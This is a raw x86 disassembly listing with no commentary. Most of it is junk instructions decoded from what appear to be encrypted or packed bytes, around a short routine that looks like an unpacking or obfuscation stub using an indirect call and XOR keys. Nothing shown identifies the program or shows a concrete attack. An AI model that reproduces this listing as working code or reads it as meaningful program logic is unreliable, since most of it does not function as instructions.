  404942:	call   0xa5e1:0x7f2d69da
  404949:	ret    
  40494a:	xor    esi,eax
  40494c:	jl     0x4048d9
  40494e:	mov    ecx,edx
  404950:	sub    esi,esp
  404952:	jecxz  0x4048ff
  404954:	in     eax,dx
  404955:	push   0xffffffbc
  404957:	fcmovnu st,st(5)
  404959:	pop    esi
  40495a:	sbb    BYTE PTR [ebx+0xc19141],0xc7
  404961:	lods   eax,DWORD PTR ds:[esi]
  404962:	fst    DWORD PTR [ebx-0x6d]
  404965:	xor    al,0x50
  404967:	cmp    DWORD PTR [edi-0x76c2bc00],edx
  40496d:	dec    ebx
  40496e:	inc    esp
  40496f:	pop    ss
  404970:	push   edx
  404971:	mov    bh,0x32
  404973:	stos   DWORD PTR es:[edi],eax
  404974:	test   edx,0x878c5d00
  40497a:	add    DWORD PTR [edi],esi
  40497c:	scas   eax,DWORD PTR es:[edi]
  40497d:	bound  esp,QWORD PTR [esi]
  40497f:	je     0x40498d
  404981:	test   BYTE PTR [ecx-0x489ca602],dl
  404987:	mov    eax,0x42050ba
  40498c:	or     al,0xd3
  40498e:	call   0x7065:0x82ac8b71
  404995:	outs   dx,DWORD PTR ds:[esi]
  404996:	inc    edi
  404997:	dec    edx
  404998:	(bad)  
  40499a:	es dec ecx
  40499c:	je     0x4049cf
  40499e:	mov    ecx,0x911f523c
  4049a3:	mov    eax,0xa961f5d8
  4049a8:	pushf  
  4049a9:	add    DWORD PTR [ebx],ebp
  4049ab:	mov    esp,0x930b6c4a
  4049b0:	outs   dx,DWORD PTR ds:[esi]
  4049b1:	fild   WORD PTR [edx]
  4049b3:	mov    edx,DWORD PTR [edx-0x4]
  4049b6:	rol    ebx,0x88
  4049b9:	and    eax,0x747e3838
  4049be:	cmc    
  4049bf:	aaa    
  4049c0:	sbb    eax,ebp
  4049c2:	jae    0x4049b2
  4049c4:	adc    al,0xca
  4049c6:	int3   
  4049c7:	pop    ecx
  4049c8:	stos   BYTE PTR es:[edi],al
  4049c9:	lods   al,BYTE PTR ds:[esi]
  4049ca:	push   esp
  4049cb:	inc    eax
  4049cc:	data16 jg 0x4049b2
  4049cf:	xchg   edi,eax
  4049d0:	or     eax,0x84fde575
  4049d5:	into   
  4049d6:	scas   eax,DWORD PTR es:[edi]
  4049d7:	sbb    dh,BYTE PTR [ebp+0x5aafb510]
  4049dd:	popf   
  4049de:	jbe    0x4049a5
  4049e0:	push   ebx
  4049e1:	mov    al,ds:0xc43107b
  4049e6:	retf   
  4049e7:	fisttp QWORD PTR [edi+edi*2-0x65f197c8]
  4049ee:	or     ch,BYTE PTR [ebp+0x1b27470c]
  4049f4:	rol    BYTE PTR [edi+ecx*8-0x34],cl
  4049f8:	(bad)  
  4049f9:	ss nop
  4049fb:	in     al,0x5f
  4049fd:	and    cl,ah
  4049ff:	je     0x4049b8
  404a01:	stc    
  404a02:	aam    0x35
  404a04:	inc    esp
  404a05:	imul   ebp,DWORD PTR [edi+eax*4-0x2b],0xeef64965
  404a0d:	rcr    BYTE PTR [edi],0xd2
  404a10:	sbb    eax,0xdbcfd19e
  404a15:	mov    ebp,cs
  404a17:	test   ecx,edx
  404a19:	xchg   ebx,eax
  404a1a:	scas   eax,DWORD PTR es:[edi]
  404a1b:	xor    DWORD PTR [edx-0x50],edx
  404a1e:	into   
  404a1f:	xchg   esp,eax
  404a20:	or     DWORD PTR [eax+0x5fbebbf9],esi
  404a26:	sar    edx,1
  404a28:	(bad)  
  404a29:	call   0x8f74:0xf94a8533
  404a30:	xchg   edx,eax
  404a31:	inc    DWORD PTR [ebp+0xc]
  404a34:	jmp    0x404377
  404a39:	jmp    0x404b7e
  404a3e:	cmp    eax,0xf1133703
  404a43:	xor    ebx,ecx
  404a45:	sar    DWORD PTR [edx+esi*1+0x9],1
  404a49:	cld    
  404a4a:	cmp    cl,BYTE PTR [ecx+0x212480c7]
  404a50:	jo     0x404ac2
  404a52:	sbb    BYTE PTR [edi+0x70],bh
  404a55:	jo     0x404a13
  404a57:	mov    ah,0x36
  404a59:	cmp    BYTE PTR [edi-0x62a8ad22],0xa
  404a60:	xchg   DWORD PTR [ebp+0x7b],edi
  404a63:	ins    DWORD PTR es:[edi],dx
  404a64:	add    ah,BYTE PTR [ecx-0x51b37935]
  404a6a:	xor    DWORD PTR [edx+0x4],edi
  404a6d:	nop
  404a6e:	jns    0x404a69
  404a70:	xchg   esi,eax
  404a71:	xchg   ebp,eax
  404a72:	repz dec ebp
  404a74:	shl    DWORD PTR [ecx],0x86
  404a77:	cmp    al,0x2d
  404a79:	test   eax,ebx
  404a7b:	dec    ebp
  404a7c:	dec    eax
  404a7d:	lahf   
  404a7e:	xchg   DWORD PTR [eax+0x4ee16e4],edi
  404a84:	or     DWORD PTR ds:0x5acfe707,esi
  404a8a:	aad    0x8
  404a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a8d:	int3   
  404a8e:	and    DWORD PTR [ecx-0x28],edx
  404a91:	and    ch,BYTE PTR [esi-0x5c]
  404a94:	call   0x109a720b
  404a99:	xchg   ecx,eax
  404a9a:	mov    dl,BYTE PTR [esp+ebp*8]
  404a9d:	outs   dx,DWORD PTR ds:[esi]
  404a9e:	inc    edx
  404a9f:	jp     0x404ae3
  404aa1:	adc    DWORD PTR [ebp-0x1772c4f7],edi
  404aa7:	pop    ebp
  404aa8:	stc    
  404aa9:	adc    al,BYTE PTR [edx-0x2d]
  404aac:	(bad)  
  404aad:	or     eax,0x6148f39a
  404ab2:	ins    BYTE PTR es:[edi],dx
  404ab3:	dec    eax
  404ab4:	clc    
  404ab5:	test   al,0xdc
  404ab7:	xor    eax,0x5e9b674e
  404abc:	mov    ds:0x4cd7c142,al
  404ac1:	(bad)  [edx+0x1a44ffb6]
  404ac7:	mov    ebp,0x1ccaa7dd
  404acc:	xor    al,0xec
  404ace:	test   al,0xd0
  404ad0:	mov    al,ds:0x38ce5cd9
  404ad5:	data16 adc al,0xb4
  404ad8:	pop    eax
  404ad9:	xor    al,0x25
  404adb:	push   cs
  404adc:	or     ecx,esi
  404ade:	or     ebx,edx
  404ae0:	add    BYTE PTR [ebx+eiz*8-0x39cbb8e2],0x96
  404ae8:	sub    esi,DWORD PTR [edi-0x117b052e]
  404aee:	mov    dh,0x40
  404af0:	cmp    al,0x98
  404af2:	jb     0x404b2a
  404af4:	imul   edi,DWORD PTR [esp+esi*2+0x6],0xffffffdf
  404af9:	xchg   BYTE PTR [ebx],bl
  404afb:	sub    eax,0x7c846a7c
  404b00:	(bad)  
  404b01:	mov    ebp,DWORD PTR [eax-0x13]
  404b04:	(bad)  
  404b05:	in     eax,dx
  404b06:	int3   
  404b07:	xchg   ecx,eax
  404b08:	aas    
  404b09:	push   edx
  404b0a:	adc    eax,0xa84e8147
  404b0f:	inc    eax
  404b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b11:	lock xchg esp,eax
  404b13:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404b15:	dec    ebx
  404b16:	jo     0x404aed
  404b18:	loop   0x404b6a
  404b1a:	test   al,0xc8
  404b1c:	out    0xd8,al
  404b1e:	cmp    al,0xae
  404b20:	stc    
  404b21:	mov    cl,0xc6
  404b23:	or     eax,eax
  404b25:	jecxz  0x404aaf
  404b27:	sbb    esi,DWORD PTR [ecx+0x18b536ae]
  404b2d:	in     eax,dx
  404b2e:	mov    ds:0x3fd92619,al
  404b33:	das    
  404b34:	dec    esp
  404b35:	sub    eax,0x6a76feed
  404b3a:	xor    BYTE PTR [edi+0x1b],dl
  404b3d:	ror    BYTE PTR [edx-0x65871e15],0x4b
  404b44:	rcl    DWORD PTR [ebp-0x6d],1
  404b47:	sbb    BYTE PTR [edi-0x117d41c9],ch
  404b4d:	xchg   edx,eax
  404b4e:	cmp    DWORD PTR [ebp+0x2b],ebx
  404b51:	jmp    0x404af9
  404b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b54:	loopne 0x404b29
  404b56:	popf   
  404b57:	jne    0x404bd7
  404b59:	fwait
  404b5a:	sbb    al,0xa2
  404b5c:	mov    al,ds:0xed1e151e
  404b61:	std    
  404b62:	xchg   ebx,eax
  404b63:	not    bl
  404b65:	in     al,0xad
  404b67:	dec    eax
  404b68:	add    edi,DWORD PTR [edx+0x76]
  404b6b:	in     al,0x28
  404b6d:	inc    ebx
  404b6e:	cwde   
  404b6f:	adc    eax,0xd5fe58d2
  404b74:	pop    ax
  404b76:	test   al,0x13
  404b78:	stc    
  404b79:	dec    ebp
  404b7a:	test   al,0x91
  404b7c:	mov    esi,0xf0458b72
  404b81:	xor    eax,ecx
  404b83:	mov    ecx,DWORD PTR [ebp+0x10]
  404b86:	add    eax,esi
  404b88:	jmp    0x404ccd
  404b8d:	pop    esi
  404b8e:	adc    BYTE PTR [esi-0x8],bh
  404b91:	mov    esi,0x9ce666a6
  404b96:	es icebp 
  404b98:	xor    eax,0xcdf82d1f
  404b9d:	int3   
  404b9e:	and    BYTE PTR [eax+0x70],dh
  404ba1:	sbb    BYTE PTR [edi+0x70],bh
  404ba4:	jo     0x404c21
  404ba6:	and    ch,BYTE PTR [edi]
  404ba8:	outs   dx,BYTE PTR ds:[esi]
  404ba9:	test   BYTE PTR [edx+0x6e],bh
  404bac:	cld    
  404bad:	add    al,0x5a
  404baf:	ror    bl,cl
  404bb1:	or     al,0x53
  404bb3:	mov    DWORD PTR [ebp+0x11],ebp
  404bb6:	and    al,0xad
  404bb8:	mov    fs,WORD PTR [eax+ebp*2-0x32]
  404bbc:	jmp    0x4e7176a5
  404bc1:	stos   BYTE PTR es:[edi],al
  404bc2:	adc    DWORD PTR [esi-0x7c2d6fd9],0x91b43278
  404bcc:	repz fwait
  404bce:	mov    dh,0xc8
  404bd0:	bound  edx,QWORD PTR [eax+0x5ab962d1]
  404bd6:	or     DWORD PTR [edi-0x11],ebx
  404bd9:	pop    es
  404bda:	cdq    
  404bdb:	and    bl,BYTE PTR [edi+0xb]
  404bde:	and    bh,BYTE PTR [edi]
  404be0:	and    eax,DWORD PTR [edx]
  404be2:	mov    bh,bl
  404be4:	(bad)  [ebp-0x5ec8cd5b]
  404bea:	ins    BYTE PTR es:[edi],dx
  404beb:	cdq    
  404bec:	lock test DWORD PTR [eax-0x314dd307],esi
  404bf3:	out    dx,eax
  404bf4:	xchg   esi,eax
  404bf5:	aad    0x78
  404bf7:	jmp    0x68ed:0xc6271672
  404bfe:	cli    
  404bff:	loope  0x404c0a
  404c01:	jno    0x404bc4
  404c03:	push   ebp
  404c04:	adc    eax,0xa3d34cf3
  404c09:	unpckhps xmm2,XMMWORD PTR [ebp-0x22]
  404c0d:	xchg   edx,eax
  404c0e:	inc    ebp
  404c0f:	inc    esi
  404c10:	cwde   
  404c11:	pop    edi
  404c12:	and    al,0x8
  404c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c15:	mov    eax,0x54f04ab6
  404c1a:	xor    bh,BYTE PTR [ebp-0x66]
  404c1d:	dec    ecx
  404c1e:	aad    0x7b
  404c20:	std    
  404c21:	inc    ecx
  404c22:	fs cmp edi,edi
  404c25:	ficomp DWORD PTR ds:0xa94fc76f
  404c2b:	daa    
  404c2c:	hlt    
  404c2d:	dec    esi
  404c2e:	push   eax
  404c2f:	jge    0x404bcf
  404c31:	out    dx,al
  404c32:	mov    ah,BYTE PTR [edi-0x61344ae0]
  404c38:	icebp  
  404c39:	arpl   WORD PTR [bp+di],bp
  404c3c:	das    
  404c3d:	(bad)  
  404c3e:	mov    ah,0xfd
  404c40:	jnp    0x404c20
  404c42:	(bad)  
  404c43:	shl    DWORD PTR [ebx+0x49],0xf7
  404c47:	xchg   edi,eax
  404c48:	pop    ebp
  404c49:	add    BYTE PTR [eax-0x13],al
  404c4c:	jecxz  0x404c66
  404c4e:	das    
  404c4f:	pop    ebp
  404c50:	push   esp
  404c51:	adc    al,0xa1
  404c53:	fstp   TBYTE PTR [edi+0x51]
  404c56:	sub    eax,0xf2959023
  404c5b:	aam    0xf9
  404c5d:	cmp    BYTE PTR [edi+edi*2+0x62],ah
  404c61:	or     DWORD PTR [ecx],edx
  404c63:	dec    esp
  404c64:	mov    ebp,DWORD PTR [edx+0x7]
  404c67:	loope  0x404c08
  404c69:	or     eax,0xf42aefda
  404c6e:	jle    0x404bf0
  404c70:	sub    edi,ebx
  404c72:	xchg   BYTE PTR [ebp+0x250a094c],dl
  404c78:	mov    WORD PTR [edx],gs
  404c7a:	sub    BYTE PTR [edx+0x29771bfd],dh
  404c80:	stos   BYTE PTR es:[edi],al
  404c81:	jmp    0x404c86
  404c83:	jle    0x404cac
  404c85:	bound  ecx,QWORD PTR [edx+0x62]
  404c88:	inc    edx
  404c89:	popf   
  404c8a:	mov    dl,0x41
  404c8c:	or     ecx,DWORD PTR [edx-0x4f]
  404c8f:	push   ds
  404c90:	xor    DWORD PTR [ecx],esp
  404c92:	(bad)  
  404c93:	adc    ch,cl
  404c95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c96:	mov    ds:0xbe9e4b58,al
  404c9b:	fcmovnbe st,st(0)
  404c9d:	(bad)  
  404c9e:	sbb    esp,edi
  404ca0:	je     0x404d1d
  404ca2:	lods   eax,DWORD PTR ds:[esi]
  404ca3:	div    dl
  404ca5:	clc    
  404ca6:	(bad)  
  404ca7:	pusha  
  404ca8:	stos   DWORD PTR es:[edi],eax
  404ca9:	inc    esi
  404caa:	ins    DWORD PTR es:[edi],dx
  404cab:	es rcl DWORD PTR ds:[ecx+0x1f],cl
  404cb0:	mov    BYTE PTR [esi-0x5d92ed1e],ah
  404cb6:	xchg   esp,eax
  404cb7:	xor    eax,0xa2e6ee90
  404cbc:	xchg   DWORD PTR [ebx],ebx
  404cbe:	or     al,0x99
  404cc0:	lea    eax,[eax]
  404cc2:	in     eax,0xa4
  404cc4:	je     0x404d06
  404cc6:	push   edx
  404cc7:	mov    ebx,0x85ff2c9b
  404ccc:	lds    ecx,FWORD PTR [ecx-0x3d36a1ff]
  404cd2:	or     al,0x0
  404cd4:	push   ebp
  404cd5:	mov    ebp,esp
  404cd7:	push   ecx
  404cd8:	push   ecx
  404cd9:	sub    DWORD PTR ds:0x432dd6,0x432704
  404ce3:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  404cea:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  404cf1:	and    DWORD PTR ds:0x43437e,0x0
  404cfb:	xor    ecx,ecx
  404cfd:	add    ecx,DWORD PTR ds:0x43437e
  404d03:	inc    ecx
  404d04:	mov    DWORD PTR ds:0x43437e,ecx
  404d0a:	cmp    DWORD PTR ds:0x43437e,0x26
  404d11:	jne    0x404d52
  404d17:	push   DWORD PTR [ebp-0x20]
  404d1a:	push   DWORD PTR [ebp-0x24]
  404d1d:	push   0x434382
  404d22:	push   0x43438e
  404d27:	push   DWORD PTR [ebp-0x28]
  404d2a:	push   0x6ce4
  404d2f:	push   0x479e
  404d34:	push   DWORD PTR [ebp-0xc]
  404d37:	push   DWORD PTR [ebp-0x14]
  404d3a:	push   0x7cf9
  404d3f:	push   0x1b21
  404d44:	push   0x8797
  404d49:	push   DWORD PTR [ebp-0x24]
  404d4c:	call   DWORD PTR ds:0x432c32
  404d52:	cmp    DWORD PTR ds:0x43437e,0x1a
  404d59:	jb     0x404cfb
  404d5f:	neg    edx
  404d61:	mov    eax,DWORD PTR [ebp-0x4]
  404d64:	push   esi
  404d65:	xor    ecx,0x4a51
  404d6b:	mov    esi,DWORD PTR [ebp-0x8]
  404d6e:	mov    edx,0x7510855
  404d73:	xor    eax,edx
  404d75:	xor    esi,edx
  404d77:	mov    ecx,0x32729c
  404d7c:	adc    DWORD PTR ds:0x43441d,0x4006
  404d86:	jmp    0x40500a
  404d8b:	popa   
  404d8c:	sahf   
  404d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d8e:	mov    fs,WORD PTR [ebx-0x6b]
  404d91:	jno    0x404e04
  404d93:	mov    al,ds:0x6019e646
  404d98:	in     al,0x69
  404d9a:	sbb    esp,esi
  404d9c:	das    
  404d9d:	jo     0x404e0f
  404d9f:	fnstcw WORD PTR [esi+0x70]
  404da2:	jo     0x404db7
  404da4:	pushf  
  404da5:	jae    0x404d58
  404da7:	cdq    
  404da8:	xchg   BYTE PTR [ebx],cl
  404daa:	xchg   DWORD PTR [esp+ebp*2],esp
  404dad:	sub    al,BYTE PTR [ebx]
  404daf:	jbe    0x404dd0
  404db1:	pop    ss
  404db2:	je     0x404dd3
  404db4:	mov    ds:0x737bf49b,al
  404db9:	iret   
  404dba:	add    eax,0xe4d1ee3f
  404dbf:	or     BYTE PTR [ecx],dh
  404dc1:	jnp    0x404db0
  404dc3:	inc    ecx
  404dc4:	jb     0x404e12
  404dc6:	or     eax,0x51c29d54
  404dcb:	ret    
  404dcc:	dec    esi
  404dcd:	mov    ebx,0x76d690c3
  404dd2:	push   0xed9931c4
  404dd7:	mov    al,0xbd
  404dd9:	repz add eax,0xb9c48bff
  404ddf:	mov    eax,ds:0x49d84351
  404de4:	dec    edi
  404de5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404de6:	mov    dh,0x6
  404de8:	hlt    
  404de9:	sbb    ebx,DWORD PTR [ebx-0x11]
  404dec:	jb     0x404d77
  404dee:	xor    eax,0xfb097770
  404df3:	push   ebp
  404df4:	lock or DWORD PTR gs:[edi-0x48abf1a3],esi
  404dfc:	mov    dl,0x1d
  404dfe:	jae    0x404e56
  404e00:	outs   dx,BYTE PTR ds:[esi]
  404e01:	sub    BYTE PTR [eax],0x12
  404e04:	inc    ebx
  404e05:	pop    ds
  404e06:	mov    eax,DWORD PTR [eax+0x2bf21580]
  404e0c:	inc    esp
  404e0d:	dec    esi
  404e0e:	add    eax,0x3fa9b900
  404e13:	xor    DWORD PTR [ebx+0x2fe9beee],ecx
  404e19:	shl    DWORD PTR [ecx+0x36503518],cl
  404e1f:	inc    ebp
  404e20:	inc    eax
  404e21:	call   0x9c636083
  404e26:	lock enter 0x3f8e,0x9f
  404e2b:	mov    WORD PTR [eax],ds
  404e2d:	cwde   
  404e2e:	shl    BYTE PTR [edx],1
  404e30:	mov    ebx,0x633a4ad3
  404e35:	std    
  404e36:	lock test bl,al
  404e39:	shl    BYTE PTR [edi+0x71],1
  404e3c:	adc    al,0xd0
  404e3e:	fbstp  TBYTE PTR [ecx]
  404e40:	popf   
  404e41:	test   edi,esi
  404e43:	dec    ebx
  404e44:	jne    0x404e7c
  404e46:	sub    edx,DWORD PTR [esi-0x4f]
  404e49:	mov    esi,cr4
  404e4c:	test   BYTE PTR [esi+ebp*4],bh
  404e4f:	sti    
  404e50:	into   
  404e51:	add    al,0xcb
  404e53:	ja     0x404e81
  404e55:	pop    ds
  404e56:	cmp    eax,0x24568e60
  404e5b:	mov    bl,0x11
  404e5d:	xor    eax,0xfd995338
  404e62:	fld    QWORD PTR [esi-0x2c]
  404e65:	and    eax,edi
  404e67:	call   0x7adc12c9
  404e6c:	into   
  404e6d:	mov    esi,0x8a3c9edb
  404e72:	iret   
  404e73:	test   DWORD PTR [ecx+0x68],ebx
  404e76:	retf   0xe304
  404e79:	jge    0x404eb8
  404e7b:	inc    edi
  404e7c:	hlt    
  404e7d:	cli    
  404e7e:	ds push eax
  404e80:	mov    bh,0x30
  404e82:	(bad)  [ecx+0x40d49f30]
  404e88:	pop    ebp
  404e89:	push   ecx
  404e8a:	out    dx,eax
  404e8b:	add    al,0xcf
  404e8d:	inc    esi
  404e8e:	xor    ecx,DWORD PTR ss:[eax]
  404e91:	pop    esp
  404e92:	lock daa 
  404e94:	ins    DWORD PTR es:[edi],dx
  404e95:	and    DWORD PTR [edi-0x5452bba6],esp
  404e9b:	and    BYTE PTR [eax+ebx*1+0x6],ch
  404e9f:	aas    
  404ea0:	ror    ch,0xd1
  404ea3:	adc    BYTE PTR [edx+0x63],bh
  404ea6:	pop    edi
  404ea7:	shl    DWORD PTR [ecx-0x152fc9fa],1
  404ead:	sar    di,0x68
  404eb1:	mov    ch,0x62
  404eb3:	outs   dx,DWORD PTR ds:[esi]
  404eb4:	xor    al,0xe1
  404eb6:	push   ss
  404eb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404eb8:	int    0xf9
  404eba:	std    
  404ebb:	jno    0x404e56
  404ebd:	mov    ds:0xb8d01c19,al
  404ec2:	xor    DWORD PTR [edi-0x488cdf2d],esi
  404ec8:	lds    eax,FWORD PTR [esi-0x3d]
  404ecb:	mov    ebp,0x762e9576
  404ed0:	dec    ebx
  404ed1:	push   ebp
  404ed2:	and    DWORD PTR [ebx-0x1fe2b1fb],esi
  404ed8:	mov    esp,0x94a0b093
  404edd:	jecxz  0x404ee8
  404edf:	stos   DWORD PTR es:[edi],eax
  404ee0:	adc    bl,BYTE PTR [edi]
  404ee2:	lea    esi,ds:0x6caf3808
  404ee8:	sub    DWORD PTR [edi+0x2f],edi
  404eeb:	je     0x404ecb
  404eed:	fild   DWORD PTR [ecx]
  404eef:	pop    esi
  404ef0:	mov    ebp,0x129a9b12
  404ef5:	jmp    0xb6539d16
  404efa:	les    edx,FWORD PTR [ecx+0x42c244eb]
  404f00:	and    DWORD PTR [esp+edi*4],esi
  404f03:	inc    ebp
  404f04:	aam    0x85
  404f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f08:	test   BYTE PTR [edx+0x5d],bh
  404f0b:	pop    ecx
  404f0c:	adc    BYTE PTR [edx+0x3f5b5ddb],bl
  404f12:	mov    esi,0x2cf3e45b
  404f17:	das    
  404f18:	sbb    eax,0xc65fd20b
  404f1d:	retf   
  404f1e:	sbb    ah,BYTE PTR [esi]
  404f20:	fsubr  DWORD PTR [esi+0x5156145]
  404f26:	mov    ds:0x7ed76419,al
  404f2b:	mov    ebx,0xe1654fcb
  404f30:	ds add eax,0x943cb433
  404f36:	mov    ecx,cs
  404f38:	mov    cl,0x7a
  404f3a:	inc    ecx
  404f3b:	and    ebx,ebx
  404f3d:	pop    edx
  404f3e:	ror    BYTE PTR [edx+ebp*4],cl
  404f41:	mov    dl,0xfe
  404f43:	push   0x2f
  404f45:	popf   
  404f46:	mov    DWORD PTR cs:[ecx+0x33],0x9350b35c
  404f4e:	imul   edi,DWORD PTR [edx-0x42a95970],0x4389f9ea
  404f58:	cs icebp 
  404f5a:	or     ebx,edx
  404f5c:	jb     0x404f46
  404f5e:	cmp    ch,BYTE PTR [ebp+0x4643663f]
  404f64:	cmp    al,0xda
  404f66:	xor    dl,cl
  404f68:	es lahf 
  404f6a:	pusha  
  404f6b:	pop    ebp
  404f6c:	arpl   WORD PTR [esi],sp
  404f6e:	jbe    0x404fed
  404f70:	or     BYTE PTR [ecx+0x3c0ce990],0x4e
  404f77:	jo     0x404f1d
  404f79:	loop   0x404f7b
  404f7b:	popa   
  404f7c:	mov    ecx,0xd88e0c52
  404f81:	inc    eax
  404f82:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f84:	pushf  
  404f85:	fnstsw WORD PTR [ecx+0x650854c0]
  404f8b:	xor    edx,eax
  404f8d:	icebp  
  404f8e:	pop    ds
  404f8f:	dec    edx
  404f90:	(bad)  
  404f91:	mov    esi,0xb928deef
  404f96:	sub    BYTE PTR [edx-0x5a],cl
  404f99:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  404f9b:	outs   dx,DWORD PTR ds:[esi]
  404f9c:	mov    ebp,0xcdd4c391
  404fa1:	add    eax,0xf52090b0
  404fa6:	in     eax,dx
  404fa7:	inc    esi
  404fa8:	enter  0x692b,0x78
  404fac:	and    bl,BYTE PTR [ebx+0x64]
  404faf:	push   0xedd2ac4d
  404fb4:	mov    cl,0xc5
  404fb6:	inc    ebp
  404fb7:	pop    ebx
  404fb8:	fld    DWORD PTR [ebp+ebx*4-0x7543d73b]
  404fbf:	stos   DWORD PTR es:[edi],eax
  404fc0:	or     ebx,esi
  404fc2:	and    al,0xa2
  404fc4:	inc    ebp
  404fc5:	sub    cl,dh
  404fc7:	jae    0x404fce
  404fc9:	ss into 
  404fcb:	cmp    al,0x7f
  404fcd:	test   eax,0xd016b4f4
  404fd2:	mov    edx,gs
  404fd4:	inc    edi
  404fd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fd6:	loope  0x40502b
  404fd8:	lds    esp,FWORD PTR [ebp+0x40]
  404fdb:	lahf   
  404fdc:	sub    eax,0x85814e8c
  404fe1:	xlat   BYTE PTR ds:[ebx]
  404fe2:	sti    
  404fe3:	pusha  
  404fe4:	leave  
  404fe5:	(bad)  
  404fe6:	push   edi
  404fe7:	adc    ebp,DWORD PTR ds:0x5981e4c9
  404fed:	mov    al,0x68
  404fef:	lods   eax,DWORD PTR ds:[esi]
  404ff0:	adc    eax,0xd0bf3fe1
  404ff5:	js     0x405048
  404ff7:	sahf   
  404ff8:	cdq    
  404ff9:	cmp    BYTE PTR [edx-0x65],dh
  404ffc:	inc    ebx
  404ffd:	imul   ebp,DWORD PTR [ebp-0x1dd5cb2],0xf65172aa
  405007:	mov    edi,0xf103580c
  40500c:	xor    DWORD PTR ds:0x434396,0x260
  405016:	add    eax,ecx
  405018:	imul   eax,esi
  40501b:	mov    DWORD PTR ds:0x43438a,0x336a
  405025:	mov    esi,DWORD PTR [ebp+0xc]
  405028:	mov    DWORD PTR ds:0x434396,0x44f4
  405032:	cmp    esi,eax
  405034:	mov    DWORD PTR ds:0x432dca,0x3ddd
  40503e:	jne    0x4052de
  405044:	mov    eax,DWORD PTR [ebp-0x4]
  405047:	mov    esi,DWORD PTR [ebp-0x8]
  40504a:	xor    eax,edx
  40504c:	jmp    0x4052d0
  405051:	test   DWORD PTR [ebp+0xb],ebx
  405054:	cmp    al,0xf3
  405056:	push   0x55
  405058:	popa   
  405059:	and    DWORD PTR [esi],0x2f
  40505c:	adc    al,0xfb
  40505e:	test   al,0x46
  405060:	jb     0x4050bf
  405062:	sub    eax,0x7ed97070
  405067:	jo     0x4050d9
  405069:	idiv   bh
  40506b:	push   0x32711cf4
  405070:	push   ds
  405071:	scas   eax,DWORD PTR es:[edi]
  405072:	fmul   DWORD PTR [edx-0x15da4b6d]
  405078:	imul   eax,ebp,0xae5ba385
  40507e:	mov    ebp,DWORD PTR [ecx]
  405080:	push   edi
  405081:	xchg   ebp,eax
  405082:	jmp    0x41aa86b3
  405087:	std    
  405088:	sub    bh,0x26
  40508b:	idiv   BYTE PTR [esi]
  40508d:	and    esi,DWORD PTR [ecx]
  40508f:	push   edx
  405090:	sti    
  405091:	and    BYTE PTR [edx],ah
  405093:	cld    
  405094:	push   0xfffffff6
  405096:	iret   
  405097:	mov    ecx,0x61f64653
  40509c:	cmp    ah,dh
  40509e:	hlt    
  40509f:	sub    edx,eax
  4050a1:	cwde   
  4050a2:	cmp    ah,cl
  4050a4:	into   
  4050a5:	cmc    
  4050a6:	stos   BYTE PTR es:[edi],al
  4050a7:	call   0x9033ad75
  4050ac:	(bad)  
  4050ad:	data16 in al,0x3
  4050b0:	stos   DWORD PTR es:[edi],eax
  4050b1:	out    0x76,eax
  4050b3:	sbb    al,0x1e
  4050b5:	pushf  
  4050b6:	inc    esp
  4050b7:	les    esi,FWORD PTR [ebx+0x9]
  4050ba:	cli    
  4050bb:	pop    esi
  4050bc:	push   esp
  4050bd:	dec    ebx
  4050be:	(bad)  
  4050bf:	dec    esp
  4050c0:	arpl   WORD PTR [esi],di
  4050c2:	mov    al,ds:0xf8706534
  4050c7:	jbe    0x405062
  4050c9:	xor    eax,0x8b83be91
  4050ce:	and    eax,DWORD PTR [edi+0x194fdae3]
  4050d4:	mov    ebp,0x3d6bc368
  4050d9:	psubsw mm5,mm6
  4050dc:	lods   al,BYTE PTR ds:[esi]
  4050dd:	dec    esi
  4050de:	out    dx,al
  4050df:	aad    0xc0
  4050e1:	cmp    DWORD PTR [ebx+0x6a],edx
  4050e4:	add    bl,bl
  4050e6:	pop    es
  4050e7:	cmp    ecx,DWORD PTR [edi]
  4050e9:	push   ecx
  4050ea:	imul   eax,DWORD PTR [edx],0xffffffc2
  4050ed:	mov    BYTE PTR [ebx],bh
  4050ef:	ret    
  4050f0:	and    DWORD PTR [ecx+eiz*1],eax
  4050f3:	xchg   ebx,eax
  4050f4:	jmp    0x5c8:0xe99af67
  4050fb:	or     eax,0x4844cbbb
  405100:	or     bh,bl
  405102:	pop    ebp
  405103:	mov    edx,0xdc305a78
  405108:	mov    edi,0xae8376a5
  40510d:	jno    0x4050b6
  40510f:	lahf   
  405110:	(bad)  
  405111:	sub    edx,DWORD PTR [esi-0x3b]
  405114:	jns    0x405113
  405116:	and    al,0x74
  405118:	cmp    esp,esi
  40511a:	test   bh,0x49
  40511d:	(bad)  
  40511f:	jb     0x4050f8
  405121:	retf   0x97e4
  405124:	inc    ebp
  405125:	sub    al,0x67
  405127:	mov    ch,0x9d
  405129:	rcr    BYTE PTR [ecx+0x2ac04fff],1
  40512f:	iret   
  405130:	jo     0x4050c0
  405132:	push   ss
  405133:	cmp    eax,eax
  405135:	aaa    
  405136:	sti    
  405137:	inc    ebx
  405138:	cld    
  405139:	pop    esi
  40513a:	jge    0x4050e7
  40513c:	adc    al,bl
  40513e:	cmp    dl,BYTE PTR [edx]
  405140:	mov    edi,0x27272fcc
  405145:	jecxz  0x4051b5
  405147:	jle    0x4050d7
  405149:	scas   al,BYTE PTR es:[edi]
  40514a:	popa   
  40514b:	bt     eax,esi
  40514e:	cmp    DWORD PTR [edx-0x2c],edi
  405151:	fwait
  405152:	or     eax,0x1749d2aa
  405157:	mov    ch,0x2b
  405159:	mov    cl,0x39
  40515b:	std    
  40515c:	push   ebp
